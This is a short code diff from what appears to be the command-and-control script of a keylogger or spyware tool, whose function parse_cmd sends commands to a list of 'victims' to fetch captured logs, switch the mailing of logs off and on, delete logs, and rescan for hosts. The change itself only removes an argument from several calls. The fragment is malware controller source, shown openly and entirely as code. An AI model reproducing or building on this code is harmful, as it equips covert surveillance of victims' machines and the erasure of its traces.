@@ -78,30 +78,30 @@ def parse_cmd(victims, PORT):
     if intent == 'getlog':
         if target == 'all':
             for addr in victims:
-                get_log(addr, PORT, intent, victims)
+                get_log(addr, PORT, intent)
         else:
-            get_log(target, PORT, intent, victims)
+            get_log(target, PORT, intent)
         parse_cmd(victims, PORT)
     elif intent == 'mailoff':
         if target == 'all':
             for addr in victims:
-                mail_off(addr, PORT, victims, intent)
+                mail_off(addr, PORT, intent)
         else:
-            mail_off(target, PORT, victims, intent)
+            mail_off(target, PORT, intent)
         parse_cmd(victims, PORT)
     elif intent == 'mailon':
         if target == 'all':
             for addr in victims:
-                mail_on(addr, PORT, victims, intent)
+                mail_on(addr, PORT, intent)
         else:
-            mail_on(target, PORT, victims, intent)
+            mail_on(target, PORT, intent)
         parse_cmd(victims, PORT)
     elif intent == 'rmlog':
         if target == 'all':
             for addr in victims:
-                rm_log(addr, PORT, victims, intent)
+                rm_log(addr, PORT, intent)
         else:
-            rm_log(target, PORT, victims, intent)
+            rm_log(target, PORT, intent)
         parse_cmd(victims, PORT)
     elif intent == 'rescan':
         main()
